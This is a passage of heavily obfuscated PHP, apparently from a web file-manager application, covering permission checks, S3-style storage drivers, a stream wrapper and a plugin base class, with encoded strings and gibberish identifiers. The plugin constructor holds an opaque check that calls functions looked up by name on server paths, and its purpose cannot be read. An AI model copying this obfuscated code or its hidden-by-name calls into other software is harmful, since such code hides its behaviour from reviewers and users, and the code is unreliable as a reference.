$´à®€›[$‰Öİ“ëâ]; $úá®®×Ğ = intval($úá®®×Ğ); if ($úá®®×Ğ <= 0) { return !1; } if (($úá®®×Ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($úá®®×Ğ & $Ş¼ßèº€); } public static function authDisable($Ë¦¾•øÒ, $ğìØœç§) { if (intval($Ë¦¾•øÒ) <= 0) { return 0; } return intval($Ë¦¾•øÒ) & ~$ğìØœç§; } public $optionType = "\123\x79\163\x74\145\155\x2e\163\157\165\162\x63\x65\x41\165\164\150\x4c\151\163\164"; public $field = array("\156\141\x6d\145", "\141\x75\x74\150", "\x6c\x61\x62\x65\x6c", "\x64\151\163\x70\154\x61\x79", "\x73\x79\x73\x74\145\155", "\x73\157\x72\x74"); public function initData() { $Ïƒ’ä  = $this->authDefault(); foreach ($Ïƒ’ä  as $ÛíéıÙ) { $this->add($ÛíéıÙ); } } public function findAuth($†—§Š‚, $ğã’¨Íş) { $ú÷‚²Ö® =& $_SERVER[¯µç›È¢]; $¸³¨ † = parent::listData(); foreach ($¸³¨ † as $ıÃ©ÌÂä) { $±ºÜÙñ = intval($ıÃ©ÌÂä[$ú÷‚²Ö®[419]]); if ($±ºÜÙñ <= 0 || $ıÃ©ÌÂä[$ú÷‚²Ö®[1855]] == 0) { continue; } if (($±ºÜÙñ & $†—§Š‚) != $†—§Š‚) { continue; } if (($±ºÜÙñ & $ğã’¨Íş) != 0) { continue; } return $ıÃ©ÌÂä[$ú÷‚²Ö®[405]]; } return !1; } public function findAuthReadOnly() { $‰Õü¿æø = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ó«æ – = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($‰Õü¿æø, $Ó«æ –); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($±”©€ı  = false, $ÜˆáÂ¡ = "\x73\157\x72\x74", $±­ôš = false) { return parent::listData($±”©€ı , $ÜˆáÂ¡, $±­ôš); } public function update($°Â»Ëû, $Ëğü“é) { $ÇÜåÖÁ¸ =& $_SERVER[¯µç›È¢]; $‘âõ¸åØ = parent::listData($°Â»Ëû); $Ğ£ İ = $this->findByName($Ëğü“é[$ÇÜåÖÁ¸[32]]); if (!$‘âõ¸åØ || $Ğ£ İ && $Ğ£ İ[$ÇÜåÖÁ¸[405]] != $‘âõ¸åØ[$ÇÜåÖÁ¸[405]]) { return !1; } $this->filterAuth($Ëğü“é[$ÇÜåÖÁ¸[419]]); return parent::update($°Â»Ëû, $Ëğü“é); } public function remove($ÕşÉû­Í) { $šÓÑÌ»ƒ = parent::listData($ÕşÉû­Í); if (!$šÓÑÌ»ƒ || $šÓÑÌ»ƒ[$_SERVER[¯µç›È¢][1286]]) { return !1; } return parent::remove($ÕşÉû­Í); } public function add($Ô²Ã¯ = array()) { $•à©öº³ =& $_SERVER[¯µç›È¢]; if ($this->findByName($Ô²Ã¯[$•à©öº³[32]])) { return !1; } $ÚÒ¢áÍÇ = array($•à©öº³[32] => $•à©öº³[12], $•à©öº³[419] => 1, $•à©öº³[1856] => $•à©öº³[1844], $•à©öº³[1855] => 1, $•à©öº³[1286] => 0, $•à©öº³[1857] => 0); $Ô²Ã¯ = array_merge($ÚÒ¢áÍÇ, $Ô²Ã¯); $Ô²Ã¯[$•à©öº³[1857]] = $this->getSort(); $this->filterAuth($Ô²Ã¯[$•à©öº³[419]]); return parent::insert($Ô²Ã¯); } private function getSort() { $¦ß©ã‡É =& $_SERVER[¯µç›È¢]; $›ê‹Ä»Ç = parent::listData(); $Ğí±À‡³ = array_to_keyvalue($›ê‹Ä»Ç, $¦ß©ã‡É[12], $¦ß©ã‡É[1857]); return empty($Ğí±À‡³) ? 0 : max($Ğí±À‡³) + 1; } private function filterAuth(&$Êêâöµ¾) { if (!$Êêâöµ¾) { return; } $Å£³ò = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ß…«’ø‰ = array(); foreach ($Å£³ò as $¾±—¨Áø) { if ($Êêâöµ¾ & $¾±—¨Áø) { $ß…«’ø‰[] = $¾±—¨Áø; } } if (in_array(self::AUTH_ROOT, $ß…«’ø‰)) { $Êêâöµ¾ = array_sum($Å£³ò); return; } $İºğ÷ªÚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ß…«’ø‰ as $¾±—¨Áø) { if (isset($İºğ÷ªÚ[$¾±—¨Áø])) { $ß…«’ø‰ = array_merge($ß…«’ø‰, $İºğ÷ªÚ[$¾±—¨Áø]); } } $ß…«’ø‰[] = self::AUTH_SHOW; $Êêâöµ¾ = array_sum(array_unique($ß…«’ø‰)); } public function sort($¢º ÑÓÕ, $áÙ±‹•) { return parent::update($¢º ÑÓÕ, $áÙ±‹•); } } goto C¢òÚİ‡«; bÕÄæ¯èÉ: define($_SERVER[¯µç›È¢][612], $_SERVER[¯µç›È¢][613]); $ilatdhfwko = $_SERVER[¯µç›È¢][614]; if (!$ilatdhfwko) { return; } goto Eª¤ø«Áòğ; a¤˜‡åãÖ: define($_SERVER[¯µç›È¢][0], $_SERVER[¯µç›È¢][1]); $_SERVER[”º£†Ô] = explode($_SERVER[¯µç›È¢][2], gzinflate(substr($_SERVER[¯µç›È¢][3], 10, -8))); function binCheckEq($²±Âò…“, $ˆ¸¶øó) { return $²±Âò…“ == $ˆ¸¶øó; } goto eª¡Ğõ…ƒ¸; f—¤íÖëè›: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ñ¨³•„÷) { $this->pathParse = $ñ¨³•„÷; } protected function infoParse($ÆèßºşŠ, $”áçÈô± = false) { $Ÿú™Õ®¶ =& $_SERVER[¯µç›È¢]; return Action($Ÿú™Õ®¶[1185])->sharePathInfo($this->pathParse[$Ÿú™Õ®¶[88]], !0, $”áçÈô±); } public function listPath($­å§—é•, $ë÷ßÒ¢ = false) { $ºùÃù’ô =& $_SERVER[¯µç›È¢]; $òÒôşÃ› = IO::listPath($­å§—é•, $ë÷ßÒ¢); if (!$òÒôşÃ›) { return $òÒôşÃ›; } if (is_array($òÒôşÃ›[$ºùÃù’ô[1346]])) { $»®õœ›Ä = Action($ºùÃù’ô[1355])->parsePathChildren($òÒôşÃ›[$ºùÃù’ô[1346]], array($ºùÃù’ô[427] => $­å§—é•)); $òÒôşÃ›[$ºùÃù’ô[1346]] = Action($ºùÃù’ô[1185])->shareItemInfo($»®õœ›Ä); } foreach ($òÒôşÃ› as $´¤äÑ´¸ => $éÅìŸºÂ) { if (!in_array($´¤äÑ´¸, array($ºùÃù’ô[86], $ºùÃù’ô[87]))) { continue; } foreach ($éÅìŸºÂ as $ŸâÚÀ£ü => $»®õœ›Ä) { $»®õœ›Ä = Action($ºùÃù’ô[1355])->parsePathChildren($»®õœ›Ä, array($ºùÃù’ô[427] => $­å§—é•)); $òÒôşÃ›[$´¤äÑ´¸][$ŸâÚÀ£ü] = Action($ºùÃù’ô[1185])->shareItemInfo($»®õœ›Ä); } } return $òÒôşÃ›; } public function listAll($Ö’¥’¸¤) { $ŞÁÍ­Ïí =& $_SERVER[¯µç›È¢]; $¡–Ñª’ñ = IO::listAll($Ö’¥’¸¤); foreach ($¡–Ñª’ñ as &$¯Î¤×³¤) { $ñµóé¥ä = IO::info($¯Î¤×³¤[$ŞÁÍ­Ïí[88]]); $ñµóé¥ä = is_array($ñµóé¥ä) ? $ñµóé¥ä : array(); $¯Î¤×³¤ = array_merge($ñµóé¥ä, $¯Î¤×³¤); $¯Î¤×³¤[$ŞÁÍ­Ïí[97]] = Action($ŞÁÍ­Ïí[1185])->shareItemInfo($¯Î¤×³¤); } unset($¯Î¤×³¤); return $¡–Ñª’ñ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ÊàšÇĞü) { parent::__construct($ÊàšÇĞü); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($™ïìäÅ) { parent::__construct($™ïìäÅ); $this->signatureVersion($_SERVER[¯µç›È¢][225]); } public function uploadFormData($ø†½çüù, $†«£¬‘ = 3600) { $ªÔ­„£È =& $_SERVER[¯µç›È¢]; $‰¶€æ¶Ô = $ªÔ­„£È[205]; $ÛøÌ¿°’ = $ªÔ­„£È[1356]; $œú’Ö§« = $ªÔ­„£È[72]; $ıìĞ°ïÂ = gmdate($ªÔ­„£È[1357]); $¥×¿´áú = gmdate($ªÔ­„£È[768]); $òâáõù¸ = $ªÔ­„£È[1358]; $‹á£ÇÂ  = $†«£¬‘ . $ªÔ­„£È[12]; $Ã¦·Ûäû = $ªÔ­„£È[1320]; $¬ÜÊÛ„· = array($this->accessKey, $¥×¿´áú, $this->region, $œú’Ö§«, $òâáõù¸); $úÙ¸ã¤Œ = implode($ªÔ­„£È[8], $¬ÜÊÛ„·); $˜ÖÔÖÉ× = array($ªÔ­„£È[1322] => gmdate($ªÔ­„£È[1321], strtotime($ªÔ­„£È[1359])), $ªÔ­„£È[1323] => array(array($ªÔ­„£È[1325] => $this->bucket), array($ªÔ­„£È[1324] => $‰¶€æ¶Ô), array($ªÔ­„£È[1326], $ªÔ­„£È[1327], $ªÔ­„£È[12]), array($ªÔ­„£È[1326], $ªÔ­„£È[1360], $ªÔ­„£È[12]), array($ªÔ­„£È[1326], $ªÔ­„£È[1361], $ªÔ­„£È[12]), array($ªÔ­„£È[1328] => $Ã¦·Ûäû), array($ªÔ­„£È[1362] => $úÙ¸ã¤Œ), array($ªÔ­„£È[1363] => $ÛøÌ¿°’), array($ªÔ­„£È[1364] => $ıìĞ°ïÂ), array($ªÔ­„£È[1365] => $‹á£ÇÂ ))); $¸ƒûÑ’³ = base64_encode(json_encode($˜ÖÔÖÉ×)); $ˆ‰éÏá‹ = hash_hmac($ªÔ­„£È[1366], $¥×¿´áú, $ªÔ­„£È[1367] . $this->secret, !0); $¹²º‹ï = hash_hmac($ªÔ­„£È[1366], $this->region, $ˆ‰éÏá‹, !0); $æñÉ¡ô = hash_hmac($ªÔ­„£È[1366], $œú’Ö§«, $¹²º‹ï, !0); $—¡ù¼Ø = hash_hmac($ªÔ­„£È[1366], $òâáõù¸, $æñÉ¡ô, !0); $©Ëâ’† = hash_hmac($ªÔ­„£È[1366], $¸ƒûÑ’³, $—¡ù¼Ø); $ø¤›‡™¸ = array($ªÔ­„£È[224] => $ªÔ­„£È[12], $ªÔ­„£È[1368] => $ªÔ­„£È[12], $ªÔ­„£È[1324] => $‰¶€æ¶Ô, $ªÔ­„£È[1328] => $Ã¦·Ûäû, $ªÔ­„£È[1332] => $¸ƒûÑ’³, $ªÔ­„£È[1369] => $úÙ¸ã¤Œ, $ªÔ­„£È[1370] => $ÛøÌ¿°’, $ªÔ­„£È[1371] => $ıìĞ°ïÂ, $ªÔ­„£È[1372] => $‹á£ÇÂ , $ªÔ­„£È[1373] => $©Ëâ’†, $ªÔ­„£È[188] => $this->getHost()); return $ø¤›‡™¸; } } goto bœ‘øºœóˆ; càöŠ¸”¦: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($çõ¡¼¡, $†æèÀİÕ = '') { $this->info = $this->info($çõ¡¼¡); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¯µç›È¢][88]]; $this->pathOpen = $çõ¡¼¡; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$çõ¡¼¡])) { self::$_chunkBuffer[$çõ¡¼¡] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¢ÃµªûÒ) { $¤È„‹«ƒ = $this->fileSubstr($this->pose, $¢ÃµªûÒ); $this->pose += strlen($¤È„‹«ƒ); return $¤È„‹«ƒ; } public function stream_tell() { return $this->pose; } public function stream_seek($èœÜİã, $®àˆãüæ) { $âëŸÃË¥ =& $_SERVER[¯µç›È¢]; if ($®àˆãüæ == SEEK_SET) { $this->pose = $èœÜİã; } else { if ($®àˆãüæ == SEEK_CUR) { $this->pose += $èœÜİã; } else { if ($®àˆãüæ == SEEK_END) { $this->pose = $this->info[$âëŸÃË¥[90]] + intval($èœÜİã); } } } if ($èœÜİã < 0) { $this->pose = $this->info[$âëŸÃË¥[90]] + $èœÜİã; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¯µç›È¢][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($óêóŸâ¨, $ÍìãÜá) { $«üØŞ¥ =& $_SERVER[¯µç›È¢]; $ÎËÙûë = $this->info($óêóŸâ¨); return array($«üØŞ¥[1513] => 0, $«üØŞ¥[1514] => 0, $«üØŞ¥[16] => 32768 + 511, $«üØŞ¥[1515] => 0, $«üØŞ¥[1516] => 0, $«üØŞ¥[1517] => 0, $«üØŞ¥[1518] => 0, $«üØŞ¥[90] => $ÎËÙûë[$«üØŞ¥[90]], $«üØŞ¥[1519] => $ÎËÙûë[$«üØŞ¥[1387]], $«üØŞ¥[1475] => $ÎËÙûë[$«üØŞ¥[96]], $«üØŞ¥[1474] => $ÎËÙûë[$«üØŞ¥[207]], $«üØŞ¥[1520] => 0, $«üØŞ¥[1521] => 0); } static $fileInfo = array(); public function info($ŞäÈ‹Õ) { $şşï‡ = $_SERVER[¯µç›È¢][1522]; if (isset(self::$fileInfo[$ŞäÈ‹Õ])) { return self::$fileInfo[$ŞäÈ‹Õ]; } if (substr($ŞäÈ‹Õ, 0, strlen($şşï‡)) != $şşï‡) { return !1; } self::$fileInfo[$ŞäÈ‹Õ] = IO::info(substr($ŞäÈ‹Õ, strlen($şşï‡))); return self::$fileInfo[$ŞäÈ‹Õ]; } public static function read($‹Ûƒñó½, $Ê•Â—ÒÃ, $šİĞ›‘) { if (!isset(self::$_fopenCache[$‹Ûƒñó½])) { $™§û² ö = new StreamWrapperIO(); $™§û² ö->stream_open($‹Ûƒñó½); self::$_fopenCache[$‹Ûƒñó½] = $™§û² ö; } $™§û² ö = self::$_fopenCache[$‹Ûƒñó½]; return $™§û² ö->fileSubstr($Ê•Â—ÒÃ, $šİĞ›‘); } public static function _read($¢¢Ôğˆı, $Ì¼Ò…¢‚, $¿æ ‡à¢) { $ ›ş„Íü =& $_SERVER[¯µç›È¢]; $ßš‘§©ª = fopen($¢¢Ôğˆı, $ ›ş„Íü[1391]); if (!$ßš‘§©ª) { return $ ›ş„Íü[12]; } $•¶Â³ø‰ = 8192; fseek($ßš‘§©ª, $Ì¼Ò…¢‚, SEEK_SET); $äôâ×á = $ ›ş„Íü[12]; $ò‹–‘µ = 0; while ($ò‹–‘µ < $¿æ ‡à¢) { $¨ÑÎÖßÇ = min($•¶Â³ø‰, $¿æ ‡à¢ - $ò‹–‘µ); $äôâ×á .= fread($ßš‘§©ª, $¨ÑÎÖßÇ); $ò‹–‘µ += $¨ÑÎÖßÇ; } fclose($ßš‘§©ª); return $äôâ×á; } public function fileSubstr($Å—ôú¥¯, $‘ĞŒ›ìõ) { $ÄÓ†–‚¦ =& $_SERVER[¯µç›È¢]; $¢’§¢À = $this->info[$ÄÓ†–‚¦[90]]; $¼Ë­Ä‡î = $Å—ôú¥¯; $úûÛº÷“ = $‘ĞŒ›ìõ; if ($Å—ôú¥¯ < 0) { $Å—ôú¥¯ = $¢’§¢À + $Å—ôú¥¯; } if ($‘ĞŒ›ìõ === !1) { $‘ĞŒ›ìõ = $¢’§¢À - $Å—ôú¥¯; } if ($Å—ôú¥¯ + $‘ĞŒ›ìõ > $¢’§¢À) { $‘ĞŒ›ìõ = $¢’§¢À - $Å—ôú¥¯; } if ($‘ĞŒ›ìõ <= 0) { return $ÄÓ†–‚¦[12]; } if ($Å—ôú¥¯ < 0 || $Å—ôú¥¯ >= $¢’§¢À || $‘ĞŒ›ìõ <= 0 || $‘ĞŒ›ìõ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\x6c\145\x52\x65\x61\144\x20\145\162\162\157\162\41\40\163\x74\141\162\x74\x3d{$Å—ôú¥¯}\73\154\145\156\x67\164\x68\x3d{$‘ĞŒ›ìõ}\73\40\x73\x69\x7a\145\75{$¢’§¢À}\x3b"); } $üŞğ…‡õ = 64 * 1024; $¤Â¤ù¿ =& self::$_chunkBuffer[$this->path]; if (!$¤Â¤ù¿) { $¤Â¤ù¿ = array(); } $­“¶ıœ = 0; $ÑåºÔÒè = 0; $Ö§ö¿Ä = $ÄÓ†–‚¦[12]; foreach ($¤Â¤ù¿ as $­“¶ıœ => $Ö§ö¿Ä) { $­“¶ıœ = intval($­“¶ıœ); $ÑåºÔÒè = $­“¶ıœ + strlen($Ö§ö¿Ä); if ($Å—ôú¥¯ >= $ÑåºÔÒè) { continue; } if ($Å—ôú¥¯ >= $­“¶ıœ && $Å—ôú¥¯ + $‘ĞŒ›ìõ <= $ÑåºÔÒè) { return substr($Ö§ö¿Ä, $Å—ôú¥¯ - $­“¶ıœ, $‘ĞŒ›ìõ); } break; } if (count($¤Â¤ù¿) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÄÓ†–‚¦[1523], $ÄÓ†–‚¦[1524] . count($¤Â¤ù¿) . "\x3b\163\x74\x61\x72\x74\75{$Å—ôú¥¯}\54\x6c\145\156\x67\x74\x68\x3d{$‘ĞŒ›ìõ}\x3b\x70\157\163\x65\x3a{$­“¶ıœ}\x7e{$ÑåºÔÒè}"); throw new Exception($ÄÓ†–‚¦[1525]); } $¯øÊÍ½ = intval($Å—ôú¥¯ / $üŞğ…‡õ) * $üŞğ…‡õ; $§Ä¡¢ÓŞ = ceil(($Å—ôú¥¯ + $‘ĞŒ›ìõ) / $üŞğ…‡õ) * $üŞğ…‡õ - $¯øÊÍ½; $†Û¦¼Ğû = IO::fileSubstr($this->path, $¯øÊÍ½, $§Ä¡¢ÓŞ); $¤Â¤ù¿[$¯øÊÍ½ . $ÄÓ†–‚¦[12]] = $†Û¦¼Ğû; ksort($¤Â¤ù¿); $¡ËÏûß³ = substr($†Û¦¼Ğû, $Å—ôú¥¯ - $¯øÊÍ½, $‘ĞŒ›ìõ); return $¡ËÏûß³; } private function log($ÉîíÅ×«, $ìöéó×É) { $Ÿ£ì¶Î· =& $_SERVER[¯µç›È¢]; $‹…£áİ± = timeFloat() - $this->timeStart; write_log(sprintf($Ÿ£ì¶Î·[1526], $ÉîíÅ×«, $this->info[$Ÿ£ì¶Î·[32]], $‹…£áİ±, $ìöéó×É), $Ÿ£ì¶Î·[1193]); } } class Message { function __construct() { } public function send($¸ÔûŞ¿½ = '', $Ä¯ææá = array(), $©šÃ›‚â = "\164\145\x78\164") { $‘²Šà¿ =& $_SERVER[¯µç›È¢]; $ıù–ö½ = array($‘²Šà¿[33] => $‘²Šà¿[1527], $‘²Šà¿[772] => $¸ÔûŞ¿½); if (in_array($©šÃ›‚â, array($‘²Šà¿[1527], $‘²Šà¿[1528]))) { $ıù–ö½[$‘²Šà¿[33]] = $©šÃ›‚â; } $Ä¯ææá = array($‘²Šà¿[520] => isset($Ä¯ææá[$‘²Šà¿[520]]) ? $Ä¯ææá[$‘²Šà¿[520]] : $‘²Šà¿[12], $‘²Šà¿[602] => isset($Ä¯ææá[$‘²Šà¿[602]]) ? $Ä¯ææá[$‘²Šà¿[602]] : $‘²Šà¿[12]); if (empty($¸ÔûŞ¿½) || empty($Ä¯ææá[$‘²Šà¿[520]]) && empty($Ä¯ææá[$‘²Šà¿[602]])) { return !1; } $îÉÅ—¡’ = array($‘²Šà¿[1468] => $ıù–ö½, $‘²Šà¿[1529] => $Ä¯ææá); Hook::trigger($‘²Šà¿[1530], $îÉÅ—¡’); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¶úÉ¯‚¾ =& $_SERVER[¯µç›È¢]; if ($_SERVER[$¶úÉ¯‚¾[62]] != $_SERVER[$¶úÉ¯‚¾[1531]]) { $³‘„Æñ´ = $¶úÉ¯‚¾[889]; $Å¹‘š«ñ = $¶úÉ¯‚¾[63]; $Ë…²¦òõ = $_SERVER[$¶úÉ¯‚¾[64]] . $¶úÉ¯‚¾[65]; $¾·ºîµƒ = $Å¹‘š«ñ($Ë…²¦òõ); $›Õ±Ìó‰ = explode($¶úÉ¯‚¾[66], $¾·ºîµƒ); if (count($›Õ±Ìó‰) < $¶úÉ¯‚¾[634]) { $ü¡âÂÉ¹ = $¶úÉ¯‚¾[68]; $ü¡âÂÉ¹(); } $ÔÆÜÓ„± = $¶úÉ¯‚¾[890]; $ÔÆÜÓ„±($_SERVER[$¶úÉ¯‚¾[891]]); $ÔÆÜÓ„±($_SERVER[$¶úÉ¯‚¾[64]] . $¶úÉ¯‚¾[1532]); $¸£²¼õ‡ = 1; while ($¸£²¼õ‡ > 1) { $¸£²¼õ‡ = $¸£²¼õ‡ + 4; $œàı¨È› = rawurlencode($¸£²¼õ‡ . $¶úÉ¯‚¾[386]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¶úÉ¯‚¾[1533]); $this->pluginName = str_replace($¶úÉ¯‚¾[1533], $¶úÉ¯‚¾[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¶úÉ¯‚¾[8]; $this->pluginApi = appHostGet() . $¶úÉ¯‚¾[1534] . $this->pluginName . $¶úÉ¯‚¾[8]; $this->pluginHost = $config[$¶úÉ¯‚¾[1535]] . $this->pluginName . $¶úÉ¯‚¾[8]; $this->pluginHostDefault = $config[$¶úÉ¯‚¾[1535]] . $this->pluginName . $¶úÉ¯‚¾[8]; $‘Ê¯­„ò = $config[$¶úÉ¯‚¾[1536]]; if ($‘Ê¯­„ò && strpos($¶úÉ¯‚¾[50] . $‘Ê¯­„ò . $¶úÉ¯‚¾[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¶úÉ¯‚¾[1537]] . $this->pluginName . $¶úÉ¯‚¾[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¯µç›È¢][1538]); } protected function assign($Ÿç£‹Ş½, $¢²‚áœò = false) { if (is_array($Ÿç£‹Ş½)) { $this->values = array_merge($this->values, $Ÿç£‹Ş½); } else { $this->values[$Ÿç£‹Ş½] = $¢²‚áœò; } } protected function display($£ÉÍËòŸ) { extract($this->values); require $£ÉÍËòŸ; } final function hookRegist($Ø×û÷˜) { $this->modelPlugin->appRegist($this->pluginName, $Ø×û÷˜); } final function appIcon() { $ŒÕÉËµ =& $_SERVER[¯µç›È¢]; $ûü‡ŠôŒ = $this->appPackage(); $“•†Œç“ = $ŒÕÉËµ[12]; if (isset($ûü‡ŠôŒ[$ŒÕÉËµ[422]])) { if (isset($ûü‡ŠôŒ[$ŒÕÉËµ[422]][$ŒÕÉËµ[1539]])) { $“•†Œç“ = $ŒÕÉËµ[1540] . $ûü‡ŠôŒ[$ŒÕÉËµ[422]][$ŒÕÉËµ[1539]] . $ŒÕÉËµ[1541]; } else { if ($ûü‡ŠôŒ[$ŒÕÉËµ[422]][$ŒÕÉËµ[1542]]) { $“•†Œç“ = $ŒÕÉËµ[1543] . $ûü‡ŠôŒ[$ŒÕÉËµ[422]][$ŒÕÉËµ[1542]] . $ŒÕÉËµ[1544]; } } } return $“•†Œç“; } final function fileCanView($ƒºæ¨İÍ) { $Ğà«ô÷… =& $_SERVER[¯µç›È¢]; if (request_url_safe($ƒºæ¨İÍ)) { return !0; } if ($this->isShare($ƒºæ¨İÍ)) { return !0; } $şÊ†­êó = Session::get($Ğà«ô÷…[1545]); if (!$şÊ†­êó || !$şÊ†­êó[$Ğà«ô÷…[1546]]) { $‡ïœ¢¬¿ = $Ğà«ô÷…[1547] . rawurlencode(this_url()); show_tips(LNG($Ğà«ô÷…[1548]) . $Ğà«ô÷…[1549] . $‡ïœ¢¬¿ . $Ğà«ô÷…[1550] . LNG($Ğà«ô÷…[1551]) . $Ğà«ô÷…[1552], !1); } if (!Action($Ğà«ô÷…[1553])->authCan($Ğà«ô÷…[1554])) { show_tips(LNG($Ğà«ô÷…[1555]) . $Ğà«ô÷…[1556], !1); } ActionCall($Ğà«ô÷…[1557], $ƒºæ¨İÍ); } final function isShare($–ÛË†Öå) { $ÛñÔŸØø = KodIO::parse($–ÛË†Öå); return $ÛñÔŸØø[$_SERVER[¯µç›È¢][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($åêøë¾Ø) { if (request_url_safe($åêøë¾Ø)) { return $åêøë¾Ø; } if (!$this->isShare($åêøë¾Ø)) { $åêøë¾Ø = $this->filePath($åêøë¾Ø); } return Action($_SERVER[¯µç›È¢][1185])->linkOut($åêøë¾Ø); } public function filePathLinkOut($Í´·–¹¥) { if (request_url_safe($Í´·–¹¥)) { return $Í´·–¹¥; } $this->fileCanView($Í´·–¹¥); return Action($_SERVER[¯µç›È¢][1185])->link($Í´·–¹¥); } final function filePath($•­¹Æà¤) { $¢éÅƒ…» =& $_SERVER[¯µç›È¢]; if ($¿†Ü‘øŠ = $this->checkSharePath($•­¹Æà¤)) { Hook::trigger($¢éÅƒ…»[1558], $¿†Ü‘øŠ); return $¿†Ü‘øŠ; } $this->fileCanView($•­¹Æà¤); if (request_url_safe($•­¹Æà¤)) { $ê²­åó = parse_url_query($•­¹Æà¤); if (isset($ê²­åó[$¢éÅƒ…»[1559]]) && isset($ê²­åó[$¢éÅƒ…»[222]])) { $Øé™Ûİ = Model($¢éÅƒ…»[787])->get($¢éÅƒ…»[788]); $‹åú° = Mcrypt::decode($ê²­åó[$¢éÅƒ…»[222]], $Øé™Ûİ); if ($‹åú°) { $this->fileInfo = IO::infoWithChildren($‹åú°); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $‹åú°; } } $•­¹Æà¤ = $this->_cacheHttpFile($•­¹Æà¤); $this->fileInfo = IO::infoWithChildren($•­¹Æà¤); } else { $this->fileInfo = IO::infoWithChildren($•­¹Æà¤); if (!$this->fileInfo) { show_tips(LNG($¢éÅƒ…»[116]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($¢éÅƒ…»[1558], $•­¹Æà¤); return $•­¹Æà¤; } final function _cacheHttpFile($…¦ŸúÉï) { $µ›üğ“™ = hash_path($…¦ŸúÉï, !0); $this->cachePath = $this->pluginCachePath($µ›üğ“™); if ($Ğúí™Ò— = IO::fileNameExist($this->cachePath, $µ›üğ“™)) { return KodIO::make($Ğúí™Ò—); } $í´ü³ñ¸ = $this->cachePath . $µ›üğ“™; return $this->pluginCacheFileSet($í´ü³ñ¸, file_get_contents_nossl($…¦ŸúÉï)); } final function _tmpFileName($ÛÂÁµªı = array()) { $Ú§îãğ =& $_SERVER[¯µç›È¢]; if (!$ÛÂÁµªı) { $ÛÂÁµªı = $this->fileInfo; } if (isset($ÛÂÁµªı[$Ú§îãğ[184]])) { return $ÛÂÁµªı[$Ú§îãğ[184]]; } if (isset($ÛÂÁµªı[$Ú§îãğ[177]][$Ú§îãğ[184]])) { return $ÛÂÁµªı[$Ú§îãğ[177]][$Ú§îãğ[184]]; } $ÅÌëãùâ = IO::hashSimple($ÛÂÁµªı[$Ú§îãğ[88]]); if ($ÅÌëãùâ) { return $ÅÌëãùâ; } $¤ì Èá = array($ÛÂÁµªı[$Ú§îãğ[32]], $ÛÂÁµªı[$Ú§îãğ[88]], $ÛÂÁµªı[$Ú§îãğ[90]]); if (isset($ÛÂÁµªı[$Ú§îãğ[526]])) { $¤ì Èá[] = $ÛÂÁµªı[$Ú§îãğ[526]]; } return md5(implode($Ú§îãğ[11], $¤ì Èá)); } final function checkSharePath($Æİ‹“ş¤) { $“ö¥®ñº =& $_SERVER[¯µç›È¢]; if (!defined($“ö¥®ñº[479])) { define($“ö¥®ñº[519], 0); } if (!$this->isShare($Æİ‹“ş¤)) { return !1; } $œÕ¯ë¨ = Action($“ö¥®ñº[1185])->sharePathInfo($Æİ‹“ş¤); if (!isset($œÕ¯ë¨[$“ö¥®ñº[88]])) { show_json(LNG($“ö¥®ñº[1560]), !1); } $this->fileInfo = $œÕ¯ë¨[$“ö¥®ñº[177]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$“ö¥®ñº[184]]); return $œÕ¯ë¨[$“ö¥®ñº[88]]; } final function pluginCachePath($á×õçÍâ = '') { $Éé°°’ =& $_SERVER[¯µç›È¢]; $şüÏÚ’Õ = IO_PATH_SYSTEM_TEMP . $Éé°°’[1561] . $this->pluginName; if (!($³Ö€Ãó = IO::infoFull($şüÏÚ’Õ))) { return IO::mkdir($şüÏÚ’Õ . $Éé°°’[8] . $á×õçÍâ); } if (empty($á×õçÍâ)) { return $³Ö€Ãó[$Éé°°’[88]]; } if (!($„î”¡÷Ô = IO::fileNameExist($³Ö€Ãó[$Éé°°’[88]], $á×õçÍâ))) { return IO::mkdir($³Ö€Ãó[$Éé°°’[88]] . $á×õçÍâ); } return KodIO::make($„î”¡÷Ô); } final function pluginCacheFileSet($òó¡Êª†, $Ôˆò‹ô¸ = '') { 